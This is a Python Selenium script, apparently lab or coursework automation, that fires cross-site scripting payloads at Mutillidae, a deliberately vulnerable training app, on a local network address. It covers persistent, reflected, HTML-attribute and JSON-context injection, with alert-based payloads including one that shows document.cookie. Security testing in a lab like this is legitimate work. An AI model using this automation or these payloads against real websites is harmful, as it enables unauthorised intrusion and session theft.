"""
Kod którym posiłkowano się:
https://stackoverflow.com/questions/19003003/check-if-any-alert-exists-using-selenium-with-python
"""

from selenium.common.exceptions import (
    UnexpectedAlertPresentException,
    NoAlertPresentException,
)
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.by import By
from time import sleep
from modules.SeleniumDrivers import FirefoxBrowser


def xss_persistent(
    ip="192.168.198.128",
    sleep_time=0,
    payload="<script>alert(1);</script>",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=add-to-your-blog.php")
        browser.find_element(By.NAME, "blog_entry").send_keys(payload)
        browser.find_element(By.NAME, "add-to-your-blog-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            WebDriverWait(browser, 5).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            alert.accept()
            print("XSS Persistent successfull!")
            return True
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        print("Timeout occured!")
        return False
    except NoAlertPresentException as NO:
        print(NO)
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_reflected_1(
    ip="192.168.198.128",
    sleep_time=0,
    payload="<script>alert(1);</script>",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=dns-lookup.php")
        browser.find_element(By.NAME, "target_host").send_keys(payload)
        browser.find_element(By.NAME, "dns-lookup-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            alert.accept()
            print("XSS Reflected succeeded!")
            return True
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        print("Timeout occured!")
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_reflected_2(
    ip="192.168.198.128",
    sleep_time=0,
    payload='"><script>alert(document.cookie);</script>',
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=set-background-color.php")
        browser.find_element(By.NAME, "background_color").send_keys(payload)
        browser.find_element(By.NAME, "set-background-color-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            alert.accept()
            print("XSS reflected succeeded")
            return True
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        print("Timeout occured!")
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_via_html_attribute(
    ip="192.168.255.133",
    sleep_time=0,
    payload='"><script>alert("PWNED");</script>',
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation%2Fchange-log.html{payload}&document-viewer-php-submit-button=View+Document"
        )
        sleep(sleep_time)
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            alert.accept()
            print("XSS via html attribute successfull!")
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        print("Timeout occured!")
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_against_json(
    ip="192.168.198.128",
    sleep_time=100,
    payload="\";}}';;alert(1);let temp =';",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=pen-test-tool-lookup.php")
        select_element = WebDriverWait(browser, 5).until(
            EC.presence_of_element_located((By.ID, "idToolSelect"))
        )
        option_element = select_element.find_element(
            By.CSS_SELECTOR, 'option[value="1"]'
        )
        browser.execute_script(
            "arguments[0].value = arguments[1];", option_element, payload
        )
        modified_value = option_element.get_attribute("value")
        print(f"Modified value: {modified_value}")
        select_element = browser.find_element(By.ID, "idToolSelect")
        select = Select(select_element)
        select.select_by_index(2)
        browser.find_element(By.NAME, "pen-test-tool-lookup-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            alert.accept()
            print("XSS reflected succeeded")
            return True
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        print("Timeout occured!")
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()
